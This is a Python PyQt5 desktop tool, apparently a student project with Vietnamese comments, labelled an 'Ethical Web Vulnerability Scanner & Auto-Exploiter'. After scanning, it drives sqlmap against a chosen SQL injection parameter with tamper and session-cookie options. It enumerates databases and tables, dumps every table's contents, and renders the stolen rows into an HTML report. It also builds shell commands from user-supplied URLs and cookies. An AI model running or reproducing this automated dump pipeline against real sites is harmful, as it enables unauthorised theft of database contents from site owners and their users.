import sys
import subprocess
import re
import webbrowser
import os
import glob
import getpass
import csv
import shutil
from datetime import datetime

from PyQt5.QtWidgets import (
    QMessageBox, QApplication, QMainWindow, QWidget, QVBoxLayout, 
    QHBoxLayout, QLineEdit, QPushButton, QTextEdit, QProgressBar, 
    QLabel, QTreeWidget, QTreeWidgetItem, QSplitter
)
from PyQt5.QtCore import QObject, QThread, pyqtSignal, Qt
from urllib.parse import urlparse, parse_qs, urlencode

# Import các module core
from core.scanner import ScannerWorker
from core.exploiter import UnionExploiter
from reporting.generator import generate_report

# --- WORKER 1: CHẠY SQLMAP ---
class AttackOrchestratorWorker(QObject):
    log_received = pyqtSignal(str)
    database_found = pyqtSignal(str)
    tables_found = pyqtSignal(str, list)
    process_finished = pyqtSignal(dict)

    def __init__(self, vuln_data):
        super().__init__()
        self.vuln_data = vuln_data
        self.process = None
        self._is_stopped = False

    def _run_command(self, command):
        try:
            self.process = subprocess.Popen(
                command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                shell=True, text=True, encoding='utf-8', errors='replace'
            )
            for line in iter(self.process.stdout.readline, ''):
                if self._is_stopped: break
                clean_line = line.strip()
                if clean_line:
                    self.log_received.emit(clean_line)
                    yield clean_line
            self.process.stdout.close()
            self.process.wait()
        except Exception as e:
            self.log_received.emit(f"\n[ERROR] Failed: {e}")

    def run(self):
        # 1. Cấu hình cơ bản (KHÔNG để các tham số -D, -T, --dump ở đây)
        method = self.vuln_data.get("method", "GET")
        base_opts = "--batch --tamper=space2comment --threads=10 --time-sec=1 --common-columns --hex --fresh-queries"
        
        target = f"-u \"{self.vuln_data['url']}\""
        if method == "POST":
            data_str = urlencode(self.vuln_data.get('data', {}))
            target = f"-u \"{self.vuln_data['url']}\" --data=\"{data_str}\" -p \"{self.vuln_data['parameter']}\""
        
        cookie = f" --cookie=\"{self.vuln_data['cookie']}\"" if self.vuln_data.get("cookie") else ""
        
        # Lệnh gốc để tái sử dụng
        cmd_root = f"sqlmap {target} {cookie} {base_opts}"

        # --- STEP 1: DATABASES ---
        self.log_received.emit("\n" + "="*20 + " STEP 1: FETCHING DATABASES " + "="*20)
        found_dbs = []
        for line in self._run_command(f"{cmd_root} --dbs"):
            if line.startswith('[*]') and not any(x in line for x in ['schema', 'mysql', 'sys', 'ending @']):
                db = line[4:].strip()
                found_dbs.append(db)
                self.database_found.emit(db)

        # --- STEP 2: TABLES ---
        for db in found_dbs:
            self.log_received.emit("\n" + "="*20 + f" STEP 2: TABLES FOR {db} " + "="*20)
            tables = []
            parsing = False
            for line in self._run_command(f"{cmd_root} -D \"{db}\" --tables"):
                if line.strip().startswith('+---'): parsing = not parsing; continue
                if parsing and '|' in line:
                    table = line.split('|')[1].strip()
                    if table.lower() != "table": tables.append(table)
            
            if tables:
                self.tables_found.emit(db, tables)
                
                # --- STEP 3: DUMP DATA (QUAN TRỌNG NHẤT) ---
                for t in tables:
                    self.log_received.emit("\n" + "-"*20 + f" STEP 3: DUMPING {db}.{t} " + "-"*20)
                    # Lệnh dump phải đầy đủ -D và -T
                    dump_cmd = f"{cmd_root} -D \"{db}\" -T \"{t}\" --dump --no-cast"
                    for _ in self._run_command(dump_cmd): pass

        self.process_finished.emit({})

    def stop(self):
        self._is_stopped = True
        if self.process:
            self.process.terminate()

# --- CHƯƠNG TRÌNH CHÍNH ---
class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Ethical Web Vulnerability Scanner & Auto-Exploiter")
        self.setGeometry(100, 100, 1000, 900)
        
        self.vulnerabilities = []
        self.db_tree_items = {}
        self.scanner_thread = None
        self.attack_thread = None
        
        self.init_ui()

    def init_ui(self):
        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        main_layout = QVBoxLayout(central_widget)

        # 1. Input Group (URL & Cookie)
        input_card = QWidget()
        input_card.setStyleSheet("background-color: #f8f9fa; border: 1px solid #dee2e6; border-radius: 5px;")
        input_layout = QVBoxLayout(input_card)
        
        self.url_input = QLineEdit()
        self.url_input.setPlaceholderText("Target URL: http://localhost/qlthoitrang/?frame=chitietsp&id=31")
        self.cookie_input = QLineEdit()
        self.cookie_input.setPlaceholderText("Cookie: PHPSESSID=abc123def...")
        
        input_layout.addWidget(QLabel("Target URL:"))
        input_layout.addWidget(self.url_input)
        input_layout.addWidget(QLabel("Authentication Cookie (Optional):"))
        input_layout.addWidget(self.cookie_input)
        
        self.scan_button = QPushButton("🚀 Start Security Scan")
        self.scan_button.setStyleSheet("background-color: #007bff; color: white; font-weight: bold; height: 40px;")
        self.scan_button.clicked.connect(self.start_scan)
        input_layout.addWidget(self.scan_button)
        
        main_layout.addWidget(input_card)
        self.url_input.setStyleSheet("""
            QLineEdit {
                background-color: white;
                color: black;
                border: 1px solid #ced4da;
                padding: 6px;
                border-radius: 4px;
            }
        """)

        self.cookie_input.setStyleSheet("""
            QLineEdit {
                background-color: white;
                color: black;
                border: 1px solid #ced4da;
                padding: 6px;
                border-radius: 4px;
            }
        """)


        # 2. Progress Bar
        self.progress_bar = QProgressBar()
        main_layout.addWidget(self.progress_bar)

        # 3. Log & Results (Sử dụng Splitter)
        splitter = QSplitter(Qt.Vertical)

        # Kết quả quét
        res_widget = QWidget()
        res_layout = QVBoxLayout(res_widget)
        res_layout.addWidget(QLabel("Vulnerability Scan Results:"))
        self.results_tree = QTreeWidget()
        self.results_tree.setHeaderLabels(["Vulnerability Type", "URL", "Parameter"])
        self.results_tree.setFixedHeight(180)
        self.results_tree.itemSelectionChanged.connect(self.on_item_selection_changed)
        res_layout.addWidget(self.results_tree)
        
        btn_layout = QHBoxLayout()
        self.attack_button = QPushButton("🔥 Dump Data (sqlmap)")
        self.attack_button.setEnabled(False)
        self.report_button = QPushButton("📄 Generate Scan Report")
        self.report_button.setEnabled(False)
        btn_layout.addWidget(self.attack_button)
        btn_layout.addWidget(self.report_button)
        res_layout.addLayout(btn_layout)
        
        splitter.addWidget(res_widget)

        # Cấu trúc Database & Log tấn công
        bottom_widget = QWidget()
        bottom_layout = QHBoxLayout(bottom_widget)
        
        # Cây DB
        db_box = QVBoxLayout()
        db_box.addWidget(QLabel("Discovered Database Structure:"))
        self.db_structure_tree = QTreeWidget()
        self.db_structure_tree.setHeaderLabels(["Databases & Tables"])
        db_box.addWidget(self.db_structure_tree)
        bottom_layout.addLayout(db_box, 1)
        
        # Log Output
        log_box = QVBoxLayout()
        log_box.addWidget(QLabel("Attack Process Log:"))
        self.attack_output = QTextEdit()
        self.attack_output.setReadOnly(True)
        self.attack_output.setStyleSheet("background-color: #1e1e1e; color: #00ff00; font-family: 'Consolas';")
        log_box.addWidget(self.attack_output)
        bottom_layout.addLayout(log_box, 2)
        
        splitter.addWidget(bottom_widget)
        main_layout.addWidget(splitter)

        # Connect signals
        self.attack_button.clicked.connect(self.start_attack)
        self.report_button.clicked.connect(self.generate_scan_report)

    # --- HÀM XỬ LÝ QUÉT ---
    def start_scan(self):
        base_url = self.url_input.text()
        cookie = self.cookie_input.text()
        if not base_url: return

        self.scan_button.setEnabled(False)
        self.results_tree.clear()
        self.attack_output.clear()
        self.progress_bar.setValue(0)
        
        self.scanner_thread = QThread()
        self.scanner_worker = ScannerWorker(base_url, cookie)
        self.scanner_worker.moveToThread(self.scanner_thread)
        
        self.scanner_thread.started.connect(self.scanner_worker.run_scan)
        self.scanner_worker.log_updated.connect(lambda msg: self.attack_output.append(msg))
        self.scanner_worker.progress_updated.connect(lambda c, t: self.progress_bar.setValue(int(c/t*100)))
        self.scanner_worker.scan_finished.connect(self.scan_done)
        
        self.scanner_thread.start()

    def scan_done(self, vulnerabilities):
        self.vulnerabilities = vulnerabilities
        self.display_results()
        self.scanner_thread.quit()
        self.scan_button.setEnabled(True)
        if vulnerabilities: self.report_button.setEnabled(True)

    def display_results(self):
        self.results_tree.clear()
        for vuln in self.vulnerabilities:
            self.results_tree.addTopLevelItem(QTreeWidgetItem([vuln['type'], vuln['url'], vuln['parameter']]))
        for i in range(3): self.results_tree.resizeColumnToContents(i)

    # --- HÀM XỬ LÝ TẤN CÔNG ---
    def on_item_selection_changed(self):
        selected = self.results_tree.selectedItems()
        is_sqli = selected and "SQLi" in selected[0].text(0)
        self.attack_button.setEnabled(is_sqli)

    def start_attack(self):
        selected = self.results_tree.selectedItems()
        if not selected: return
        
        vuln_data = next((v for v in self.vulnerabilities if v['url'] == selected[0].text(1) and v['parameter'] == selected[0].text(2)), None)
        if not vuln_data: return

        vuln_data['cookie'] = self.cookie_input.text()
        self.attack_button.setEnabled(False)
        self.attack_output.clear()
        self.db_structure_tree.clear()
        self.db_tree_items = {}

        self.attack_thread = QThread()
        self.attack_worker = AttackOrchestratorWorker(vuln_data)
        self.attack_worker.moveToThread(self.attack_thread)

        self.attack_thread.started.connect(self.attack_worker.run)
        self.attack_worker.log_received.connect(self.update_attack_output)
        self.attack_worker.database_found.connect(self.add_database_to_tree)
        self.attack_worker.tables_found.connect(self.add_tables_to_db_node)
        self.attack_worker.process_finished.connect(self.attack_finished)
        
        self.attack_thread.start()

    def add_database_to_tree(self, db_name):
        item = QTreeWidgetItem([db_name])
        self.db_structure_tree.addTopLevelItem(item)
        self.db_tree_items[db_name] = item

    def add_tables_to_db_node(self, db_name, tables):
        if db_name in self.db_tree_items:
            parent = self.db_tree_items[db_name]
            for t in tables: parent.addChild(QTreeWidgetItem([t]))
            parent.setExpanded(True)

    def attack_finished(self, _):
        self.update_attack_output("\n[*] SQLMap hoàn tất. Đang tìm file CSV...")
        self.attack_thread.quit()
        
        # Đường dẫn gốc chứa toàn bộ output
        output_base = os.path.expanduser("~/.local/share/sqlmap/output")
        self.all_dumped_data = {}
        has_data = False

        if not os.path.exists(output_base):
            self.update_attack_output("[!] Không thấy thư mục output của SQLMap.")
            return

        # Quét tất cả các folder (localhost, 127.0.0.1, ...)
        for target_dir in os.listdir(output_base):
            dump_path = os.path.join(output_base, target_dir, "dump")
            if not os.path.exists(dump_path): continue

            for db_name in os.listdir(dump_path):
                db_dir = os.path.join(dump_path, db_name)
                if os.path.isdir(db_dir):
                    if db_name not in self.all_dumped_data: self.all_dumped_data[db_name] = {}
                    
                    for csv_file in glob.glob(os.path.join(db_dir, "*.csv")):
                        table_name = os.path.basename(csv_file).replace(".csv", "")
                        try:
                            with open(csv_file, 'r', encoding='utf-8') as f:
                                reader = csv.reader(f)
                                rows = list(reader)
                                if rows:
                                    self.all_dumped_data[db_name][table_name] = {
                                        'headers': rows[0],
                                        'records': rows[1:]
                                    }
                                    has_data = True
                        except: continue

        if has_data:
            self.update_attack_output("[+] Đã tải dữ liệu thành công. Đang tạo báo cáo...")
            self.generate_scan_report()
        else:
            self.update_attack_output("[!] SQLMap không dump được bản ghi nào. Hãy kiểm tra xem bảng có dữ liệu không.")

    def generate_html_report(self, data):
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"dump_report_{timestamp}.html"
        
        css = "<style>body{font-family:sans-serif; background:#f4f4f9; padding:20px} table{width:100%; border-collapse:collapse; background:#fff; margin-bottom:30px} th,td{border:1px solid #ddd; padding:10px; text-align:left} th{background:#3498db; color:white} h2{color:#2c3e50; border-bottom:2px solid #3498db}</style>"
        html = f"<html><head><title>SQLi Report</title>{css}</head><body><h1>SQL Injection Data Dump</h1>"
        
        for db, tables in data.items():
            html += f"<h2>Database: {db}</h2>"
            for t, content in tables.items():
                html += f"<h3>Table: {t}</h3><table><thead><tr>"
                for h in content['headers']: html += f"<th>{h}</th>"
                html += "</tr></thead><tbody>"
                for r in content['records']:
                    html += "<tr>" + "".join(f"<td>{cell}</td>" for cell in r) + "</tr>"
                html += "</tbody></table>"
        html += "</body></html>"
        
        with open(filename, 'w', encoding='utf-8') as f: f.write(html)
        self.update_attack_output(f"[*] Report saved: {filename}")
        webbrowser.open(f"file://{os.path.realpath(filename)}")

    def update_attack_output(self, line): self.attack_output.append(line)
    
    def generate_scan_report(self):
        if not self.vulnerabilities:
            QMessageBox.warning(self, "Warning", "No vulnerabilities to report.")
            return
            
        base_url = self.url_input.text()
        
        # Lấy dữ liệu đã dump được từ biến tạm (nếu có)
        # Biến này nên được gán trong hàm attack_finished
        dump_data = getattr(self, 'all_dumped_data', None)
        
        # Gọi generator mới
        filename = generate_report(base_url, self.vulnerabilities, dump_data)
        
        self.attack_output.append(f"\n[+] Full HTML report generated: {filename}")
        webbrowser.open(f"file://{os.path.abspath(filename)}")

    def closeEvent(self, event):
        if (self.scanner_thread and self.scanner_thread.isRunning()) or (self.attack_thread and self.attack_thread.isRunning()):
            if QMessageBox.question(self, "Exit", "A process is running. Exit?", QMessageBox.Yes|QMessageBox.No) == QMessageBox.Yes:
                event.accept()
            else: event.ignore()
        else: event.accept()

if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = MainWindow()
    window.show()
    sys.exit(app.exec_())
